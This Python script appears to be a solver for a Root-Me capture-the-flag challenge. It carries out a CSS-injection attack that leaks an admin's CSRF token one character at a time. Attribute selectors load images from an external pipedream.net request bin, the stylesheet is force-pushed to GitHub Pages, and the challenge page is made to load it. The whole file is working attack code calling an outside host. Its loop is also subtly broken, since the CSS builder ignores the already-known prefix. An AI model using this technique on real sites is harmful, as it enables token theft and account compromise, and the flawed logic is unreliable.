from time import sleep
import requests
import os

def build_css(chars):
    # supp du file
    os.remove("./a.css")

    # création du new file
    file = open("./a.css", "w") 
    file.write("""input[name="csrf"][value^="A"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/A); } 
input[name="csrf"][value^="B"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/B); } 
input[name="csrf"][value^="C"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/C); } 
input[name="csrf"][value^="D"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/D); } 
input[name="csrf"][value^="E"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/E); } 
input[name="csrf"][value^="F"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/F); } 
input[name="csrf"][value^="G"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/G); } 
input[name="csrf"][value^="H"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/H); } 
input[name="csrf"][value^="I"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/I); } 
input[name="csrf"][value^="J"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/J); } 
input[name="csrf"][value^="K"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/K); } 
input[name="csrf"][value^="L"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/L); } 
input[name="csrf"][value^="M"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/M); } 
input[name="csrf"][value^="N"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/N); } 
input[name="csrf"][value^="O"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/O); } 
input[name="csrf"][value^="P"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/P); } 
input[name="csrf"][value^="Q"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/Q); } 
input[name="csrf"][value^="R"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/R); } 
input[name="csrf"][value^="S"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/S); } 
input[name="csrf"][value^="T"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/T); } 
input[name="csrf"][value^="U"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/U); } 
input[name="csrf"][value^="V"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/V); } 
input[name="csrf"][value^="W"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/W); } 
input[name="csrf"][value^="X"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/X); } 
input[name="csrf"][value^="Y"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/Y); } 
input[name="csrf"][value^="Z"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/Z); } 
input[name="csrf"][value^="a"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/a); } 
input[name="csrf"][value^="b"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/b); } 
input[name="csrf"][value^="c"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/c); } 
input[name="csrf"][value^="d"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/d); } 
input[name="csrf"][value^="e"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/e); } 
input[name="csrf"][value^="f"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/f); } 
input[name="csrf"][value^="g"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/g); } 
input[name="csrf"][value^="h"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/h); } 
input[name="csrf"][value^="i"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/i); } 
input[name="csrf"][value^="j"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/j); } 
input[name="csrf"][value^="k"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/k); } 
input[name="csrf"][value^="l"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/l); } 
input[name="csrf"][value^="m"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/m); } 
input[name="csrf"][value^="n"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/n); } 
input[name="csrf"][value^="o"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/o); } 
input[name="csrf"][value^="p"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/p); } 
input[name="csrf"][value^="q"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/q); } 
input[name="csrf"][value^="r"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/r); } 
input[name="csrf"][value^="s"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/s); } 
input[name="csrf"][value^="t"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/t); } 
input[name="csrf"][value^="u"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/u); } 
input[name="csrf"][value^="v"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/v); } 
input[name="csrf"][value^="w"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/w); } 
input[name="csrf"][value^="x"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/x); } 
input[name="csrf"][value^="y"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/y); } 
input[name="csrf"][value^="z"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/z); } 
input[name="csrf"][value^="0"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/0); } 
input[name="csrf"][value^="1"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/1); } 
input[name="csrf"][value^="2"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/2); } 
input[name="csrf"][value^="3"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/3); } 
input[name="csrf"][value^="4"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/4); } 
input[name="csrf"][value^="5"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/5); } 
input[name="csrf"][value^="6"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/6); } 
input[name="csrf"][value^="7"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/7); } 
input[name="csrf"][value^="8"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/8); } 
input[name="csrf"][value^="9"] { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/9); } 
    """) 
    file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = ""

# envoie à admin 


while 1:
    for elt in chars:
        print("eeeeeeeeeeeeeeeeeeeeeeeeeeeee : "+elt)
        # new css
        build_css(know+elt)
        sleep(10) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push -f')

        # request POST
        # TODO: request post for aff in request bin car get et curl ne fonctionne pas
        data = {"name":"coutcout", "email":"a@gmail.com","url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", "description":"e"}
        r = requests.post("http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", data=data)
        print(r.content)

    know += input("new chars to know : ")